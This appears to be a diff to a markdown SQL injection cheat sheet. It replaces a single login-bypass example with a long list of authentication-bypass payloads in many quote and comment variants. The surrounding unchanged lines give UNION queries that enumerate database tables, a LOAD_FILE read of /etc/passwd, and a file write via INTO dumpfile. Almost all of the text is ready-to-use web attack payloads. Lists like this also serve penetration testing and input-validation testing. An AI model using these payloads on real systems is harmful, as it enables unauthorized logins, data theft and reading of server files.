@@ -33,17 +33,62 @@ Keep in mind you may have to add or subtract columns in order to get union opera
 ### Find table by name of column
 `' UNION SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'; -- `
 
-## Bypass authentication
-
-### Log in as admin user
-`admin' OR 1=1; -- `
-
 ## Local file access (requires DB admin privileges)
 ### Read file
 `' UNION ALL SELECT LOAD_FILE('/etc/passwd'); -- `
 
 ### Write file
 `SELECT * FROM some_table INTO dumpfile '/tmp/file_name';`
+
+## Authentication bypass
+
+```
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+```
 
 ## Other
 
